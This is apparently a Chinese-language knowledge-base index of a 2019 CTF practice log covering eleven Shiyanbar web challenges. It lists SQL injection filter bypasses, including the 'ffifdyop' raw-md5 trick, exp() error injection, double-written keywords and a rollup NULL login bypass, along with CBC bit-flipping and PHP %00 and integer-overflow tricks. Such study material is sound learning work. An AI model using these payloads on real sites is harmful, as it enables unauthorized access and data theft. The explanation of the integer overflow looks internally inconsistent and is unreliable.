---
title: 百道CTF刷题记录(一) — Web 基础考点索引
category: web
tags: [ctf, sqli, 刷题, yunen, shiyanbar, web基础]
triggers: [百道CTF, 刷题记录, shiyanbar, CBC翻转, FFIFDYOP, %00截断, group by with rollup, 万能密码, 双参数注释]
created: 2026-06-10
updated: 2026-06-10
sources: [raw/百道CTF刷题记录(一).md]
---

# 百道CTF刷题记录(一) — Web 基础考点索引

## Summary

Yunen 的 Shiyanbar 平台 Web + Misc 刷题录，共 11 道（2019）。涵盖 SQL 注入主流绕过技巧和 PHP 整数溢出等经典考点。

## 考点列表

| # | 题目 | 核心考点 | 详情 |
|---|------|---------|------|
| 01 | 简单的登陆题 | AES-128-CBC 字节翻转攻击 + `%00` 截断正则 | 修改 IV 控制解密后 plaintext，构造 `admin` 权限 |
| 02 | 后台登录 | `md5($password, true)` 16 位二进制格式绕过 | `ffifdyop` → `'or'6<乱码>'` 永真式 |
| 03 | 加了料的报错注入 | 双参数注释 `/*` 绕过 + `regexp` 替代 `=` + `exp(~(select...))` 报错注入 | `username=a'/*&password=*/Or exp(~(...))or'1` |
| 04 | 认真一点！ | 双层叠加绕过 + `from()for()` 替代逗号 + 布尔盲注 | `oorr`, `froo m()foorr()` 双写绕过 |
| 05 | 你真的会PHP吗？ | `is_numeric()` 截断 + int 溢出溢出 | `2147483647%00` 绕过 `is_numeric`，intval 反转后仍相等 |
| 06 | 登陆一下好吗?? | 万能密码 | `'='` 绕过（or 被过滤） |
| 07 | who are you? | 时间盲注 + `case when` 替代 `if`（逗号被过滤） | X-Forwarded-For 头部注入 |
| 08 | 因缺思汀的绕过 | `group by ... with rollup limit 1 offset N` 取 NULL 行 | 虚拟表最后一行 pwd=NULL，`pwd=` POST 空值弱类型通过 |
| 09 | 简单的sql注入之3 | `exp()` 报错注入 | 报错注入一把嗦 |
| 10 | 简单的sql注入之2 | 空格过滤 → 内联注释绕过 | `/**/select/**/group_concat(table_name)/**/from/**/...` |
| 11 | 简单的sql注入之1 | 双层叠加绕过 | `seselectlect` 双写绕过 |

## 典型 Payload

### md5 二进制格式 SQL 注入
```sql
password = md5("ffifdyop", true)
-- 得到: 'or'6<乱码>  → 拼入 SQL 变成永真式
```

### CBC 字节翻转攻击 (AES-128-CBC)
```python
# 修改 IV 中对应字节，使解密后的 plaintext 中对应位置的数据可控
# 常用于: 修改序列化后的 user 字段值，从 guest → admin
```

### group by with rollup 取 NULL 绕过
```sql
uname=1' or true group by pwd with rollup limit 1 offset 2#
pwd=    -- 空值，弱类型 NULL == "" → true
```

### PHP int 溢出 + is_numeric 截断
```
number=2147483647%00
-- is_numeric("2147483647%00") → false（%00 截断）
-- intval(strrev("2147483647%00")) → intval("7463847412") → 2147483647（32位溢出）
-- strval(intval("2147483647%00")) → "2147483647" → 相等
-- is_palindrome_number("2147483647%00") → false（%00 使字符串不对称）
```

## Connections
- Related: [[web/flask-ssti-session-forgery]], [[web/iconv-encoding-bypass-path-traversal]]
- Source: [[raw/百道CTF刷题记录(一)]]
